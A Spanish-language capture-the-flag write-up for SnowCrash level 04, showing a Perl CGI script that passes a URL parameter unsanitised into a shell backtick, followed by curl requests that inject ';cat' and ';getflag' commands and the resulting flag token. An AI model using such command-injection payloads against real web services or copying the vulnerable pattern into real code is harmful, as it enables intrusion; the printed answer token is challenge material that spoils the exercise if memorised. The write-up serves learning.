## Level 04

Lo primero que vemos al entrar es un level.pl, nada más.
Asi que destripamos el pl.

```bash
level04@SnowCrash:~$ ls
level04.pl
level04@SnowCrash:~$ cat level04.pl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
   $y = $_[0];
   print `echo $y 2>&1`;
}
x(param("x"));
```

Es un archivo perl y por lo que podemos ver parece que se puede acceder a el por el localhost:4747
Aparte de eso extrae un argumento el cual luego destripa el contenido y lo imprime. Tal que asi.

```bash
level04@SnowCrash:~$ echo "I lost the game" > /tmp/level4.txt
level04@SnowCrash:~$ curl "http://localhost:4747/level04.pl?x=%3Bcat%20/tmp/level4.txt"
I lost the game

```

Por lo que la idea que tendriamos seria hacer un ";getflag" para que termine el eco y llame a la funcion get flag, pero eso no funcionaria debido a que en web los caracteres especiales como ;,. etc se marcan con un encoding para url , en este caso el ; seria %3B 

```bash
level04@SnowCrash:~$ curl "http://localhost:4747/level04.pl?x=%3Bgetflag"
Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
```